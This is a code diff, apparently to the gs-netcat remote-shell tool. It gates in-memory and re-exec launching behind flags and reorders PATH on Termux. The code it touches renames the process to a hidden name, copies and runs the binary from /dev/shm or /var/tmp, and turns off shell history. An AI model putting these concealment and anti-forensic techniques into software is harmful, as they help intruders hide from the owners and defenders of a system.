@@ -75,7 +75,7 @@ cpy(int dst, int src) {
 	ssize_t sz;
 
 #if 0
-	// No idea why sendfile -EINVAL. Kernel claims it cant optimize?
+	// No idea why sendfile -EINVAL. Kernel claims it can't optimize?
 	// Linus: https://yarchive.net/comp/linux/sendfile.html
 	off_t ofs = lseek(src, 0, SEEK_END);
 	lseek(src, 0, SEEK_SET);
@@ -180,7 +180,8 @@ try_execme(char *exename, char *argv[]) {
 
 	argv[0] = gopt.proc_hiddenname;
 	
-	try_memexecme(src, argv);
+	if (gopt.flags & GSC_FL_MEMEXEC)
+		try_memexecme(src, argv);
 	try_cpexecme("/dev/shm", src, argv);
 	try_cpexecme("/var/tmp", src, argv);
 
@@ -473,7 +474,7 @@ try_changeargv0(int argc, char *argv[]) {
 
 	if (gopt.proc_hiddenname == NULL) {
 		DEBUGF("Config has no PROC_HIDDENNAME.\n");
-		return; // Dont want to change argv0
+		goto done; // Dont want to change argv0
 	}
 
 	if (gopt.flags & GSC_FL_STARTED_BY_SWD) {
@@ -482,13 +483,15 @@ try_changeargv0(int argc, char *argv[]) {
 		gopt.proc_hiddenname = strdup(argv[0]);
 	}
 
+	if (!(gopt.flags & GSC_FL_REEXEC))
+		goto done;
+
 	setenv("_GS_PROC_EXENAME", myself_exe, 1);
 	if (fs_exename != NULL)
 		setenv("_GS_FS_EXENAME", fs_exename, 1);
 
 	if (try_execme(myself_exe, argv) == 0)
 		exit(255); // CAN NOT HAPPEN. should -1 on execve fail.
-
 	// HERE: try_execme() FAILED. Last resort is to change just argv[0].
 
 	// No point to change argv0 if started via ld-linux because it will show binary as argv1 anyway.
@@ -1719,7 +1722,7 @@ pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 		struct stat sb;
 		str=DEFAULT_PATH;
 		if (stat("/data/data/com.termux/files/usr/bin", &sb) == 0)
-			str=DEFAULT_PATH":"ANDROID_PATH;
+			str=ANDROID_PATH":"DEFAULT_PATH;
 		snprintf(buf, sizeof buf, "PATH=%s", str);
 	}
 	envp[envplen++] = strdup(buf);
@@ -1727,7 +1730,6 @@ pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 	snprintf(buf, sizeof buf, "MAIL=/var/mail/%.50s", user);
 	envp[envplen++] = strdup(buf);
 
-	// Start with a clean environemnt (like OpenSSH does).
 	// STY = Confuses screen if gs-netcat is started from within screen (OSX)
 	// GSOCKET_ARGS = Otherwise any further gs-netcat command would
 	//    execute with same (hidden) commands as the current shell.
@@ -1736,7 +1738,6 @@ pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 	// 1. Read /etc/default/login
 	// 2. Retrieve TZ, TERM, DISPLAY, LANG, LC from client.
 	// 3. Add ~/.ssh/environment
-	
 	envp[envplen++] = "TERM=xterm-256color";
 	envp[envplen++] = "HISTFILE=/dev/null";
 	envp[envplen++] = "LESSHISTFILE=-";
